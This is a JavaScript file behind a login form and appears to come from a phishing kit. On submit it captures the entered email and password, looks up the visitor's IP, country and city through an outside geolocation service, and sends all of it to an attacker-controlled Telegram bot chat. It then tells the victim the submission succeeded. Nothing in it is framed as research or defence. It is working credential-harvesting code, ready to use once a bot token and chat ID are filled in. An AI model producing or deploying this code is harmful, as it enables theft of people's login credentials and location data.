// Replace these with your Bot Token and Chat ID!
const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("loginForm");
  const messageDiv = document.getElementById("msg");

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    const email = form.email.value;
    const password = form.password.value;

    // Get basic location data (optional, from a geolocation service, or use "navigator.geolocation")
    // For demo, simple fetch from ip-api.com
    let locationInfo = "Location: Unknown";
    try {
      const res = await fetch("https://ip-api.io/json");
      const data = await res.json();
      locationInfo = `Country: ${data.country_name || ''}, City: ${data.city || ''}, IP: ${data.ip || ''}`;
    } catch { /* ignore errors */ }

    // Format your message
    const text = `
      ---------------|54|---------------
      Username: ${email}
      Password: ${password}
      ${locationInfo}
      -------------------------------
      `;

    // Send the message to Telegram via Bot API
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text,
    };

    try {
      const telegramRes = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      if (!telegramRes.ok) throw new Error("Telegram API error");

      messageDiv.textContent = "Sent successfully!";
      form.reset();
    } catch (err) {
      messageDiv.textContent = "Failed to send. Please try again.";
    }
  });
});
